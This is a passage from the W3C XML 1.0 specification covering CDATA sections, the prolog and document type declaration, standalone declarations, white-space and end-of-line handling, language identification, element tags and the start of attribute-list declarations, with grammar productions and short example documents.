to which the instruction is directed. The target names "
`XML`
", "
`xml`
",
and so on are reserved for standardization in this or future versions of this
specification. The XML [Notation](#dt-notation "Notation") mechanism
may be used for formal declaration of PI targets. Parameter
entity references *MUST NOT* be recognized within processing instructions.

### 2.7 CDATA Sections

[Definition:
**CDATA sections** may occur anywhere character data may occur; they are used to escape blocks
of text containing characters which would otherwise be recognized as markup.
CDATA sections begin with the string "
`<![CDATA[`
"
and end with the string "
`]]>`
":]

##### CDATA Sections

| [18] | `CDSect` | ::= | `[CDStart](#NT-CDStart) [CData](#NT-CData) [CDEnd](#NT-CDEnd)` |
| --- | --- | --- | --- |
| [19] | `CDStart` | ::= | `'<![CDATA['` |
| --- | --- | --- | --- |
| [20] | `CData` | ::= | `([Char](#NT-Char)* - ([Char](#NT-Char)* ']]>' [Char](#NT-Char)*))` |
| --- | --- | --- | --- |
| [21] | `CDEnd` | ::= | `']]>'` |
| --- | --- | --- | --- |

Within a CDATA section, only the [CDEnd](#NT-CDEnd) string is
recognized as markup, so that left angle brackets and ampersands may occur
in their literal form; they need not (and cannot) be escaped using "
`&lt;`
"
and "
`&amp;`
". CDATA sections cannot nest.

An example of a CDATA section, in which "
`<greeting>`
"
and "
`</greeting>`
" are recognized as [character data](#dt-chardata "Character Data"), not [markup](#dt-markup "Markup"):

```
<![CDATA[<greeting>Hello, world!</greeting>]]>
```
### 2.8 Prolog and Document Type Declaration

[Definition: XML documents *SHOULD*
begin with an **XML declaration** which specifies the version of
XML being used.] For example, the following is a complete XML document, [well-formed](#dt-wellformed "Well-Formed") but not [valid](#dt-valid "Validity"):

```
<?xml version="1.0"?>
<greeting>Hello, world!</greeting>
```

and so is this:

```
<greeting>Hello, world!</greeting>
```

The function of the markup in an XML document is to describe its storage and
logical structure and to associate attribute
name-value pairs with its logical structures. XML provides a mechanism, the
[document
type declaration](#dt-doctype "Document Type Declaration"), to define constraints on the logical structure
and to support the use of predefined storage units. [Definition: An XML document is **valid** if it has an associated
document type declaration and if the document complies with the constraints
expressed in it.]

The document type declaration *MUST* appear before the first [element](#dt-element "Element")
in the document.

##### Prolog

| [22] | `prolog` | ::= | `[XMLDecl](#NT-XMLDecl)? [Misc](#NT-Misc)* ([doctypedecl](#NT-doctypedecl) [Misc](#NT-Misc)*)?` |
| --- | --- | --- | --- |
| [23] | `XMLDecl` | ::= | `'<?xml' [VersionInfo](#NT-VersionInfo) [EncodingDecl](#NT-EncodingDecl)? [SDDecl](#NT-SDDecl)? [S](#NT-S)? '?>'` |
| [24] | `VersionInfo` | ::= | `[S](#NT-S) 'version' [Eq](#NT-Eq) ("'" [VersionNum](#NT-VersionNum) "'" | '"' [VersionNum](#NT-VersionNum) '"')` |
| [25] | `Eq` | ::= | `[S](#NT-S)? '=' [S](#NT-S)?` |
| [26] | `VersionNum` | ::= | `'1.' [0-9]+` |
| [27] | `Misc` | ::= | `[Comment](#NT-Comment) | [PI](#NT-PI) | [S](#NT-S)` |

Even though the [VersionNum](#NT-VersionNum) production matches
any version number of the form '1.x', XML 1.0 documents *SHOULD NOT* specify a version number other than '1.0'.

**Note:**

When an XML 1.0 processor encounters a document that specifies
a 1.x version number other than '1.0', it will process it as
a 1.0 document. This means that an XML 1.0 processor will accept
1.x documents provided they do not use any non-1.0 features.

[Definition: The XML **document
type declaration** contains or points to [markup
declarations](#dt-markupdecl "markup declaration") that provide a grammar for a class of documents. This
grammar is known as a document type definition, or **DTD**. The document
type declaration can point to an external subset (a special kind of [external entity](#dt-extent "External Entity")) containing markup declarations,
or can contain the markup declarations directly in an internal subset, or
can do both. The DTD for a document consists of both subsets taken together.]

[Definition: A **markup declaration**
is an [element type declaration](#dt-eldecl "Element Type declaration"), an [attribute-list declaration](#dt-attdecl "Attribute-List Declaration"), an [entity
declaration](#dt-entdecl "entity declaration"), or a [notation declaration](#dt-notdecl "Notation Declaration").]
These declarations may be contained in whole or in part within [parameter
entities](#dt-PE "Parameter entity"), as described in the well-formedness and validity constraints
below. For further
information, see [**4 Physical Structures**](#sec-physical-struct).

##### Document Type Definition

| [28] | `doctypedecl` | ::= | `'<!DOCTYPE' [S](#NT-S) [Name](#NT-Name) ([S](#NT-S) [ExternalID](#NT-ExternalID))? [S](#NT-S)? ('[' [intSubset](#NT-intSubset) ']' [S](#NT-S)?)? '>'` | [[VC: Root Element Type]](#vc-roottype) |
| --- | --- | --- | --- | --- |
|  |  |  |  | [[WFC: External Subset]](#ExtSubset) |
| [28a] | `DeclSep` | ::= | `[PEReference](#NT-PEReference) | [S](#NT-S)` | [[WFC: PE Between Declarations]](#PE-between-Decls) |
| [28b] | `intSubset` | ::= | `([markupdecl](#NT-markupdecl) | [DeclSep](#NT-DeclSep))*` |
| [29] | `markupdecl` | ::= | `[elementdecl](#NT-elementdecl) | [AttlistDecl](#NT-AttlistDecl) | [EntityDecl](#NT-EntityDecl) | [NotationDecl](#NT-NotationDecl) | [PI](#NT-PI) | [Comment](#NT-Comment)` | [[VC: Proper Declaration/PE Nesting]](#vc-PEinMarkupDecl) |
|  |  |  |  | [[WFC: PEs in Internal Subset]](#wfc-PEinInternalSubset) |

Note
that it is possible to construct a well-formed document containing a [doctypedecl](#NT-doctypedecl)
that neither points to an external subset nor contains an internal subset.

The markup declarations may be made up in whole or in part of the [replacement text](#dt-repltext "Replacement Text") of [parameter
entities](#dt-PE "Parameter entity"). The productions later in this specification for individual
nonterminals ([elementdecl](#NT-elementdecl), [AttlistDecl](#NT-AttlistDecl),
and so on) describe the declarations *after* all the parameter
entities have been [included](#dt-include "Include").

Parameter
entity references are recognized anywhere in the DTD (internal and external
subsets and external parameter entities), except in literals, processing instructions,
comments, and the contents of ignored conditional sections (see [**3.4 Conditional Sections**](#sec-condition-sect)).
They are also recognized in entity value literals. The use of parameter entities
in the internal subset is restricted as described below.

**Validity constraint: Root Element Type**

The [Name](#NT-Name)
in the document type declaration *MUST* match the element type of the [root element](#dt-root "Root Element").

**Validity constraint: Proper Declaration/PE Nesting**

Parameter-entity [replacement text](#dt-repltext "Replacement Text")
*MUST* be properly nested with markup declarations. That is to say, if either
the first character or the last character of a markup declaration ([markupdecl](#NT-markupdecl)
above) is contained in the replacement text for a [parameter-entity
reference](#dt-PERef "Parameter-entity reference"), both *MUST* be contained in the same replacement text.

**Well-formedness constraint: PEs in Internal Subset**

In
the internal DTD subset, [parameter-entity references](#dt-PERef "Parameter-entity reference")
*MUST NOT* occur within markup declarations; they may occur where markup declarations can occur.
(This does not apply to references that occur in external parameter entities
or to the external subset.)

**Well-formedness constraint: External Subset**

The external subset, if any, *MUST* match the production for [extSubset](#NT-extSubset).

**Well-formedness constraint: PE Between Declarations**

The replacement text of a parameter entity reference
in a [DeclSep](#NT-DeclSep)
*MUST* match the production [extSubsetDecl](#NT-extSubsetDecl).

Like the internal subset, the external subset and any external parameter
entities referenced
in a [DeclSep](#NT-DeclSep)
*MUST* consist of a series of
complete markup declarations of the types allowed by the non-terminal symbol [markupdecl](#NT-markupdecl), interspersed with white space or [parameter-entity references](#dt-PERef "Parameter-entity reference"). However, portions of
the contents of the external subset or of these
external parameter entities may conditionally be ignored by using the [conditional section](#dt-cond-section "conditional section") construct; this is not
allowed in the internal subset but is
allowed in external parameter entities referenced in the internal subset.

##### External Subset

| [30] | `extSubset` | ::= | `[TextDecl](#NT-TextDecl)? [extSubsetDecl](#NT-extSubsetDecl)` |
| --- | --- | --- | --- |
| [31] | `extSubsetDecl` | ::= | `( [markupdecl](#NT-markupdecl) | [conditionalSect](#NT-conditionalSect) | [DeclSep](#NT-DeclSep))*` |

The external subset and external parameter entities also differ from the
internal subset in that in them, [parameter-entity
references](#dt-PERef "Parameter-entity reference") are permitted *within* markup declarations,
not only *between* markup declarations.

An example of an XML document with a document type declaration:

```
<?xml version="1.0"?>
<!DOCTYPE greeting SYSTEM "hello.dtd">
<greeting>Hello, world!</greeting>
```

The [system identifier](#dt-sysid "System Identifier")
"
`hello.dtd`
"
gives the address (a URI reference) of a DTD for the document.

The declarations can also be given locally, as in this example:

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE greeting [
  <!ELEMENT greeting (#PCDATA)>
]>
<greeting>Hello, world!</greeting>
```

If both the external and internal subsets are used, the internal subset
*MUST* be considered to occur before the external subset.
This has the effect that entity and attribute-list declarations in the internal
subset take precedence over those in the external subset.

### 2.9 Standalone Document Declaration

Markup declarations can affect the content of the document, as passed from
an [XML processor](#dt-xml-proc "XML Processor") to an application; examples
are attribute defaults and entity declarations. The standalone document declaration,
which may appear as a component of the XML declaration, signals whether or
not there are such declarations which appear external to the [document
entity](#dt-docent "Document Entity")
or in parameter entities. [Definition: An **external
markup declaration** is defined as a markup declaration occurring in
the external subset or in a parameter entity (external or internal, the latter
being included because non-validating processors are not required to read
them).]

##### Standalone Document Declaration

| [32] | `SDDecl` | ::= | `[S](#NT-S) 'standalone' [Eq](#NT-Eq) (("'" ('yes' | 'no') "'") | ('"' ('yes' | 'no') '"'))` | [[VC: Standalone Document Declaration]](#vc-check-rmd) |
| --- | --- | --- | --- | --- |

In a standalone document declaration, the value "yes" indicates
that there are no [external markup declarations](#dt-extmkpdecl "External Markup Declaration") which
affect the information passed from the XML processor to the application. The
value "no" indicates that there are or may be such external
markup declarations. Note that the standalone document declaration only denotes
the presence of external *declarations*; the presence, in a document,
of references to external *entities*, when those entities are internally
declared, does not change its standalone status.

If there are no external markup declarations, the standalone document declaration
has no meaning. If there are external markup declarations but there is no
standalone document declaration, the value "no" is assumed.

Any XML document for which `standalone="no"` holds can be converted
algorithmically to a standalone document, which may be desirable for some
network delivery applications.

**Validity constraint: Standalone Document Declaration**

The
standalone document declaration *MUST* have the value "no" if
any external markup declarations contain declarations of:

* attributes with [default](#dt-default "Attribute Default") values,
  if elements to which these attributes apply appear in the document without
  specifications of values for these attributes, or
* entities (other than `amp`,
  `lt`,
  `gt`,
  `apos`,
  `quot`), if [references](#dt-entref "Entity Reference")
  to those entities appear in the document, or
* attributes with
  tokenized types, where the
  attribute appears in the document with a value such that
  [normalization](#AVNormalize)
  will produce a different value from that which would be produced
  in the absence of the declaration, or
* element types with [element content](#dt-elemcontent "Element content"),
  if white space occurs directly within any instance of those types.

An example XML declaration with a standalone document declaration:

```
<?xml version="1.0" standalone='yes'?>
```
### 2.10 White Space Handling

In editing XML documents, it is often convenient to use "white space"
(spaces, tabs, and blank lines)
to set apart the markup for greater readability. Such white space is typically
not intended for inclusion in the delivered version of the document. On the
other hand, "significant" white space that should be preserved
in the delivered version is common, for example in poetry and source code.

An [XML processor](#dt-xml-proc "XML Processor")
*MUST* always pass
all characters in a document that are not markup through to the application.
A  [validating XML processor](#dt-validating "Validating Processor")
*MUST* also
inform the application which of these characters constitute white space appearing
in [element content](#dt-elemcontent "Element content").

A special [attribute](#dt-attr "Attribute") named `xml:space` may be attached to an element to signal an intention that in that element,
white space should be preserved by applications. In valid documents, this
attribute, like any other, *MUST* be [declared](#dt-attdecl "Attribute-List Declaration")
if it is used. When declared, it *MUST* be given as an [enumerated
type](#dt-enumerated "Enumerated Attribute Values") whose values
are one or both of "default" and "preserve".
For example:

```
<!ATTLIST poem  xml:space (default|preserve) 'preserve'>

<!ATTLIST pre xml:space (preserve) #FIXED 'preserve'>
```

The value "default" signals that applications' default white-space
processing modes are acceptable for this element; the value "preserve"
indicates the intent that applications preserve all the white space. This
declared intent is considered to apply to all elements within the content
of the element where it is specified, unless overridden with
another instance of the `xml:space` attribute. This specification does not give meaning to any value of `xml:space` other than "default" and "preserve". It is an error for other values to be specified; the XML processor *MAY* report the error or *MAY* recover by ignoring the attribute specification or by reporting the (erroneous) value to the application. Applications may ignore or reject erroneous values.

The [root element](#dt-root "Root Element") of any document is considered
to have signaled no intentions as regards application space handling, unless
it provides a value for this attribute or the attribute is declared with a
default value.

### 2.11 End-of-Line Handling

XML [parsed entities](#dt-parsedent "Text Entity") are often stored
in computer files which, for editing convenience, are organized into lines.
These lines are typically separated by some combination of the characters
CARRIAGE RETURN (#xD) and LINE FEED (#xA).

To
simplify the tasks of [applications](#dt-app "Application"), the
[XML
processor](#dt-xml-proc "XML Processor")
*MUST* behave as if it normalized all line breaks in external parsed
entities (including the document entity) on input, before parsing, by translating
both the two-character sequence #xD #xA and any #xD that is not followed by
#xA to a single #xA character.

### 2.12 Language Identification

In document processing, it is often useful to identify the natural or formal
language in which the content is written. A special [attribute](#dt-attr "Attribute")
named `xml:lang` may be inserted in documents to specify the language
used in the contents and attribute values of any element in an XML document.
In valid documents, this attribute, like any other, *MUST* be [declared](#dt-attdecl "Attribute-List Declaration")
if it is used. The
values of the attribute are language identifiers as defined by [[IETF BCP 47]](#RFC1766), Tags
for the Identification of Languages; in addition, the empty string may be specified.

(Productions 33 through 38 have been removed.)

For example:

```
<p xml:lang="en">The quick brown fox jumps over the lazy dog.</p>
<p xml:lang="en-GB">What colour is it?</p>
<p xml:lang="en-US">What color is it?</p>
<sp who="Faust" desc='leise' xml:lang="de">
  <l>Habe nun, ach! Philosophie,</l>
  <l>Juristerei, und Medizin</l>
  <l>und leider auch Theologie</l>
  <l>durchaus studiert mit heißem Bemüh'n.</l>
</sp>
```

The language specified by `xml:lang` applies to the element where it is specified
(including the values of its attributes), and to all elements in its content unless
overridden with another instance of `xml:lang`. In particular, the empty value of `xml:lang` is used on an element B to override
a specification of `xml:lang` on an enclosing element A, without specifying another language. Within B,
it is considered that there is no language information available, just as if `xml:lang` had not been specified
on B or any of its ancestors. Applications determine which of an element's attribute values
and which parts of its character content, if any, are treated as language-dependent values described by `xml:lang`.

**Note:**

Language information may also be provided by external transport protocols (e.g. HTTP or
MIME). When available, this information may be used by XML applications, but the more local
information provided by `xml:lang` should be considered to override it.

A simple declaration for `xml:lang` might take the form

```
xml:lang CDATA #IMPLIED
```

but specific default values may also be given, if appropriate. In a collection
of French poems for English students, with glosses and notes in English, the `xml:lang`
attribute might be declared this way:

```
<!ATTLIST poem   xml:lang CDATA 'fr'>
<!ATTLIST gloss  xml:lang CDATA 'en'>
<!ATTLIST note   xml:lang CDATA 'en'>
```
## 3 Logical Structures

[Definition: Each [XML
document](#dt-xml-doc "XML Document") contains one or more **elements**, the boundaries
of which are either delimited by [start-tags](#dt-stag "Start-Tag")
and [end-tags](#dt-etag "End Tag"), or, for [empty](#dt-empty "Empty")
elements, by an [empty-element tag](#dt-eetag "empty-element tag"). Each
element has a type, identified by name, sometimes called its "generic
identifier" (GI), and may have a set of attribute specifications.]
Each attribute specification has a [name](#dt-attrname "Attribute Name")
and a [value](#dt-attrval "Attribute Value").

##### Element

| [39] | `element` | ::= | `[EmptyElemTag](#NT-EmptyElemTag)` |
| --- | --- | --- | --- |
|  |  |  | `| [STag](#NT-STag) [content](#NT-content) [ETag](#NT-ETag)` | [[WFC: Element Type Match]](#GIMatch) |
|  |  |  |  | [[VC: Element Valid]](#elementvalid) |

This specification does not constrain the
application semantics, use, or (beyond syntax)
names of the element types and attributes, except that names beginning with
a match to `(('X'|'x')('M'|'m')('L'|'l'))` are reserved for standardization
in this or future versions of this specification.

**Well-formedness constraint: Element Type Match**

The [Name](#NT-Name)
in an element's end-tag *MUST* match the element type in the start-tag.

**Validity constraint: Element Valid**

An element is valid
if there is a declaration matching [elementdecl](#NT-elementdecl)
where the [Name](#NT-Name) matches the element type, and one of
the following holds:

1. The declaration matches **EMPTY** and the element has no [content](#dt-content "Content") (not even entity
   references, comments, PIs or white space).
2. The declaration matches [children](#NT-children) and the
   sequence of [child elements](#dt-parentchild "Parent/Child") belongs
   to the language generated by the regular expression in the content model,
   with optional white space, comments and
   PIs (i.e. markup matching production [27] [Misc](#NT-Misc)) between the
   start-tag and the first child element, between child elements, or between
   the last child element and the end-tag. Note that a CDATA section containing
   only white space or a reference
   to an entity whose replacement text is character references expanding to white
   space do not
   match the nonterminal [S](#NT-S), and
   hence cannot appear in these positions; however, a
   reference to an internal entity with a literal value consisting of character
   references expanding to white space does match [S](#NT-S), since its
   replacement text is the white space resulting from expansion of the character
   references.
3. The declaration matches [Mixed](#NT-Mixed), and the content
   (after replacing
   any entity references with their replacement text) consists of
   [character data](#dt-chardata "Character Data")
   (including [CDATA sections](#dt-cdsection "CDATA Section")),
   [comments](#dt-comment "Comment"), [PIs](#dt-pi "Processing instruction") and [child elements](#dt-parentchild "Parent/Child") whose types match names in the
   content model.
4. The declaration matches **ANY**, and the content (after replacing
   any entity references with their replacement text)
   consists of character data, [CDATA
   sections](#dt-cdsection "CDATA Section"), [comments](#dt-comment "Comment"), [PIs](#dt-pi "Processing instruction")
   and [child elements](#dt-parentchild "Parent/Child")
   whose types have been declared.
### 3.1 Start-Tags, End-Tags, and Empty-Element Tags

[Definition: The beginning of every non-empty
XML element is marked by a **start-tag**.]

##### Start-tag

| [40] | `STag` | ::= | `'<' [Name](#NT-Name) ([S](#NT-S) [Attribute](#NT-Attribute))* [S](#NT-S)? '>'` | [[WFC: Unique Att Spec]](#uniqattspec) |
| --- | --- | --- | --- | --- |
| [41] | `Attribute` | ::= | `[Name](#NT-Name) [Eq](#NT-Eq) [AttValue](#NT-AttValue)` | [[VC: Attribute Value Type]](#ValueType) |
|  |  |  |  | [[WFC: No External Entity References]](#NoExternalRefs) |
|  |  |  |  | [[WFC: No < in Attribute Values]](#CleanAttrVals) |

The [Name](#NT-Name) in the start- and end-tags gives the element's **type**. [Definition: The [Name](#NT-Name)-[AttValue](#NT-AttValue)
pairs are referred to as the **attribute specifications** of the
element], [Definition: with the [Name](#NT-Name) in each pair referred to as the **attribute name**
]
and [Definition: the content of the [AttValue](#NT-AttValue) (the text between the `'` or `"`
delimiters) as the **attribute value**.] Note
that the order of attribute specifications in a start-tag or empty-element
tag is not significant.

**Well-formedness constraint: Unique Att Spec**

An attribute name
*MUST NOT* appear more than once in the same start-tag or empty-element tag.

**Validity constraint: Attribute Value Type**

The attribute *MUST*
have been declared; the value *MUST* be of the type declared for it. (For attribute
types, see [**3.3 Attribute-List Declarations**](#attdecls).)

**Well-formedness constraint: No External Entity References**

Attribute
values *MUST NOT* contain direct or indirect entity references to external entities.

**Well-formedness constraint: No `<` in Attribute Values**

The [replacement text](#dt-repltext "Replacement Text") of any entity
referred to directly or indirectly in an attribute value *MUST NOT* contain a `<`.

An example of a start-tag:

```
<termdef id="dt-dog" term="dog">
```

[Definition: The end of every element that begins
with a start-tag *MUST* be marked by an **end-tag** containing a name
that echoes the element's type as given in the start-tag:]

##### End-tag

| [42] | `ETag` | ::= | `'</' [Name](#NT-Name) [S](#NT-S)? '>'` |
| --- | --- | --- | --- |

An example of an end-tag:

```
</termdef>
```

[Definition: The [text](#dt-text "Text")
between the start-tag and end-tag is called the element's **content**:]

##### Content of Elements

| [43] | `content` | ::= | `[CharData](#NT-CharData)? (([element](#NT-element) | [Reference](#NT-Reference) | [CDSect](#NT-CDSect) | [PI](#NT-PI) | [Comment](#NT-Comment)) [CharData](#NT-CharData)?)*` |
| --- | --- | --- | --- |

[Definition: An element
with no [content](#NT-content) is said to be **empty**.] The representation
of an empty element is either a start-tag immediately followed by an end-tag,
or an empty-element tag. [Definition: An **empty-element
tag** takes a special form:]

##### Tags for Empty Elements

| [44] | `EmptyElemTag` | ::= | `'<' [Name](#NT-Name) ([S](#NT-S) [Attribute](#NT-Attribute))* [S](#NT-S)? '/>'` | [[WFC: Unique Att Spec]](#uniqattspec) |
| --- | --- | --- | --- | --- |

Empty-element tags may be used for any element which has no content, whether
or not it is declared using the keyword **EMPTY**. [For
interoperability](#dt-interop "For interoperability"), the empty-element tag *SHOULD*
be used, and *SHOULD* only be used, for elements which are declared
EMPTY.

Examples of empty elements:

```
<IMG align="left"
 src="http://www.w3.org/Icons/WWW/w3c_home" />
<br></br>
<br/>
```
### 3.2 Element Type Declarations

The [element](#dt-element "Element") structure of an [XML document](#dt-xml-doc "XML Document") may, for [validation](#dt-valid "Validity")
purposes, be constrained using element type and attribute-list declarations.
An element type declaration constrains the element's [content](#dt-content "Content").

Element type declarations often constrain which element types can appear
as [children](#dt-parentchild "Parent/Child") of the element. At user
option, an XML processor *MAY* issue a warning when a declaration mentions an
element type for which no declaration is provided, but this is not an error.

[Definition: An **element
type declaration** takes the form:]

##### Element Type Declaration

| [45] | `elementdecl` | ::= | `'<!ELEMENT' [S](#NT-S) [Name](#NT-Name) [S](#NT-S) [contentspec](#NT-contentspec) [S](#NT-S)? '>'` | [[VC: Unique Element Type Declaration]](#EDUnique) |
| --- | --- | --- | --- | --- |
| [46] | `contentspec` | ::= | `'EMPTY' | 'ANY' | [Mixed](#NT-Mixed) | [children](#NT-children)` |

where the [Name](#NT-Name) gives the element type being declared.

**Validity constraint: Unique Element Type Declaration**

An element type *MUST NOT* be declared more than once.

Examples of element type declarations:

```
<!ELEMENT br EMPTY>
<!ELEMENT p (#PCDATA|emph)* >
<!ELEMENT %name.para; %content.para; >
<!ELEMENT container ANY>
```
#### 3.2.1 Element Content

[Definition: An element [type](#dt-stag "Start-Tag") has **element content** when elements
of that type *MUST* contain only [child](#dt-parentchild "Parent/Child")
elements (no character data), optionally separated by white space (characters
matching the nonterminal [S](#NT-S)).]
[Definition: In this case, the constraint includes a **content
model**, a simple grammar governing the allowed types of the
child elements and the order in which they are allowed to appear.]
The grammar is built on content particles ([cp](#NT-cp)s), which
consist of names, choice lists of content particles, or sequence lists of
content particles:

##### Element-content Models

| [47] | `children` | ::= | `([choice](#NT-choice) | [seq](#NT-seq)) ('?' | '*' | '+')?` |
| --- | --- | --- | --- |
| [48] | `cp` | ::= | `([Name](#NT-Name) | [choice](#NT-choice) | [seq](#NT-seq)) ('?' | '*' | '+')?` |
| [49] | `choice` | ::= | `'(' [S](#NT-S)? [cp](#NT-cp) ( [S](#NT-S)? '|' [S](#NT-S)? [cp](#NT-cp) )+ [S](#NT-S)? ')'` | [[VC: Proper Group/PE Nesting]](#vc-PEinGroup) |
| [50] | `seq` | ::= | `'(' [S](#NT-S)? [cp](#NT-cp) ( [S](#NT-S)? ',' [S](#NT-S)? [cp](#NT-cp) )* [S](#NT-S)? ')'` | [[VC: Proper Group/PE Nesting]](#vc-PEinGroup) |

where each [Name](#NT-Name) is the type of an element which
may appear as a [child](#dt-parentchild "Parent/Child"). Any content
particle in a choice list may appear in the [element
content](#dt-elemcontent "Element content") at the location where the choice list appears in the grammar;
content particles occurring in a sequence list *MUST* each appear in the [element content](#dt-elemcontent "Element content") in the order given in the list.
The optional character following a name or list governs whether the element
or the content particles in the list may occur one or more (`+`),
zero or more (`*`), or zero or one times (`?`). The
absence of such an operator means that the element or content particle *MUST*
appear exactly once. This syntax and meaning are identical to those used in
the productions in this specification.

The content of an element matches a content model if and only if it is
possible to trace out a path through the content model, obeying the sequence,
choice, and repetition operators and matching each element in the content
against an element type in the content model. [For
compatibility](#dt-compat "For Compatibility"), it is an error if the content model
allows an element to match more than one occurrence of an element type in the
content model. For more information, see [**E Deterministic Content Models**](#determinism).

**Validity constraint: Proper Group/PE Nesting**

Parameter-entity [replacement text](#dt-repltext "Replacement Text")
*MUST* be properly nested with parenthesized
groups. That is to say, if either of the opening or closing parentheses in
a [choice](#NT-choice), [seq](#NT-seq), or [Mixed](#NT-Mixed)
construct is contained in the replacement text for a [parameter
entity](#dt-PERef "Parameter-entity reference"), both *MUST* be contained in the same replacement text.

[For interoperability](#dt-interop "For interoperability"), if a parameter-entity reference
appears in a [choice](#NT-choice), [seq](#NT-seq), or [Mixed](#NT-Mixed) construct, its replacement text *SHOULD* contain at
least one non-blank character, and neither the first nor last non-blank character
of the replacement text *SHOULD* be a connector (`|` or `,`).

Examples of element-content models:

```
<!ELEMENT spec (front, body, back?)>
<!ELEMENT div1 (head, (p | list | note)*, div2*)>
<!ELEMENT dictionary-body (%div.mix; | %dict.mix;)*>
```
#### 3.2.2 Mixed Content

[Definition: An element [type](#dt-stag "Start-Tag")
has **mixed content** when elements of that type may contain character
data, optionally interspersed with [child](#dt-parentchild "Parent/Child")
elements.] In this case, the types of the child elements may be constrained,
but not their order or their number of occurrences:

##### Mixed-content Declaration

| [51] | `Mixed` | ::= | `'(' [S](#NT-S)? '#PCDATA' ([S](#NT-S)? '|' [S](#NT-S)? [Name](#NT-Name))* [S](#NT-S)? ')*'` |
| --- | --- | --- | --- |
|  |  |  | `| '(' [S](#NT-S)? '#PCDATA' [S](#NT-S)? ')'` | [[VC: Proper Group/PE Nesting]](#vc-PEinGroup) |
|  |  |  |  | [[VC: No Duplicate Types]](#vc-MixedChildrenUnique) |

where the [Name](#NT-Name)s give the types of elements that
may appear as children. The
keyword **#PCDATA** derives historically from the term "parsed
character data."

**Validity constraint: No Duplicate Types**

The
same name *MUST NOT* appear more than once in a single mixed-content declaration.

Examples of mixed content declarations:

```
<!ELEMENT p (#PCDATA|a|ul|b|i|em)*>
<!ELEMENT p (#PCDATA | %font; | %phrase; | %special; | %form;)* >
<!ELEMENT b (#PCDATA)>
```
### 3.3 Attribute-List Declarations

[Attributes](#dt-attr "Attribute") are used to associate name-value
pairs with [elements](#dt-element "Element"). Attribute specifications
*MUST NOT* appear outside of [start-tags](#dt-stag "Start-Tag") and [empty-element tags](#dt-eetag "empty-element tag"); thus, the productions used to
recognize them appear in [**3.1 Start-Tags, End-Tags, and Empty-Element Tags**](#sec-starttags). Attribute-list declarations
may be used:

* To define the set of attributes pertaining to a given element type.
* To establish type constraints for these attributes.
* To provide [default values](#dt-default "Attribute Default") for
  attributes.

[Definition:
**Attribute-list
declarations** specify the name, data type, and default value (if any)
of each attribute associated with a given element type:]

##### Attribute-list Declaration

| [52] | `AttlistDecl` | ::= | `'<!ATTLIST' [S](#NT-S) [Name](#NT-Name) [AttDef](#NT-AttDef)* [S](#NT-S)? '>'` |
| --- | --- | --- | --- |
| [53] | `AttDef` | ::= | `[S](#NT-S) [Name](#NT-Name) [S](#NT-S) [AttType](#NT-AttType) [S](#NT-S) [DefaultDecl](#NT-DefaultDecl)` |
| --- | --- | --- | --- |

The [Name](#NT-Name) in the [AttlistDecl](#NT-AttlistDecl)
rule is the type of an element. At user option, an XML processor *MAY* issue
a warning if attributes are declared for an element type not itself declared,
but this is not an error. The [Name](#NT-Name) in the [AttDef](#NT-AttDef)
rule is the name of the attribute.

When more than one [AttlistDecl](#NT-AttlistDecl) is provided
for a given element type, the contents of all those provided are merged. When
more than one definition is provided for the same attribute of a given element
type, the first declaration is binding and later declarations are ignored. [For interoperability,](#dt-interop "For interoperability") writers of DTDs may choose
to provide at most one attribute-list declaration for a given element type,
at most one attribute definition for a given attribute name in an attribute-list
declaration, and at least one attribute definition in each attribute-list
declaration. For interoperability, an XML processor *MAY* at user option
issue a warning when more than one attribute-list declaration is provided
for a given element type, or more than one attribute definition is provided
for a given attribute, but this is not an error.

#### 3.3.1 Attribute Types

XML attribute types are of three kinds: a string type, a set of tokenized
types, and enumerated types. The string type may take any literal string as
a value; the tokenized types are more constrained.
The validity constraints noted in the grammar are applied after the attribute
value has been normalized as described in [**3.3.3 Attribute-Value Normalization**](#AVNormalize).

##### Attribute Types

| [54] | `AttType` | ::= | `[StringType](#NT-StringType) | [TokenizedType](#NT-TokenizedType) | [EnumeratedType](#NT-EnumeratedType)` |
| --- | --- | --- | --- |
| [55] | `StringType` | ::= | `'CDATA'` |
| [56] | `TokenizedType` | ::= | `'ID'` | [[VC: ID]](#id) |
|  |  |  |  | [[VC: One ID per Element Type]](#one-id-per-el) |
|  |  |  |  | [[VC: ID Attribute Default]](#id-default) |
|  |  |  | `| 'IDREF'` | [[VC: IDREF]](#idref) |
|  |  |  | `| 'IDREFS'` | [[VC: IDREF]](#idref) |
|  |  |  | `| 'ENTITY'` | [[VC: Entity Name]](#entname) |
|  |  |  | `| 'ENTITIES'` | [[VC: Entity Name]](#entname) |
|  |  |  | `| 'NMTOKEN'` | [[VC: Name Token]](#nmtok) |
|  |  |  | `| 'NMTOKENS'` | [[VC: Name Token]](#nmtok) |

**Validity constraint: ID**

Values of type **ID**
*MUST* match the [Name](#NT-Name) production. A name *MUST NOT* appear more than once
in an XML document as a value of this type; i.e., ID values *MUST* uniquely
identify the elements which bear them.

**Validity constraint: One ID per Element Type**

An element type *MUST NOT* have more than one ID attribute specified.

**Validity constraint: ID Attribute Default**

An ID attribute
*MUST* have a declared default of **#IMPLIED** or **#REQUIRED**.

**Validity constraint: IDREF**

Values of type **IDREF**
*MUST*
match the [Name](#NT-Name) production, and values of type **IDREFS**
*MUST* match [Names](#NT-Names); each [Name](#NT-Name)
*MUST* match the value of an ID attribute on some element in the XML document;
i.e. **IDREF** values *MUST* match the value of some ID attribute.

**Validity constraint: Entity Name**

Values of type **ENTITY**
*MUST* match the [Name](#NT-Name) production, values of type **ENTITIES**
*MUST* match [Names](#NT-Names); each [Name](#NT-Name)
*MUST* match the name of an [unparsed entity](#dt-unparsed "Unparsed Entity")
declared in the [DTD](#dt-doctype "Document Type Declaration").

**Validity constraint: Name Token**

Values of type **NMTOKEN**
*MUST* match the [Nmtoken](#NT-Nmtoken) production; values of type **NMTOKENS**
*MUST* match [Nmtokens](#NT-Nmtokens).

[Definition:
**Enumerated attributes**
have a list of allowed values in their declaration
]. They *MUST* take one of those values. There are two kinds of enumerated attribute types:

##### Enumerated Attribute Types

| [57] | `EnumeratedType` | ::= | `[NotationType](#NT-NotationType) | [Enumeration](#NT-Enumeration)` |
| --- | --- | --- | --- |
| [58] | `NotationType` | ::= | `'NOTATION' [S](#NT-S) '(' [S](#NT-S)? [Name](#NT-Name) ([S](#NT-S)? '|' [S](#NT-S)? [Name](#NT-Name))* [S](#NT-S)? ')'` | [[VC: Notation Attributes]](#notatn) |
| --- | --- | --- | --- | --- |
|  |  |  |  | [[VC: One Notation Per Element Type]](#OneNotationPer) |
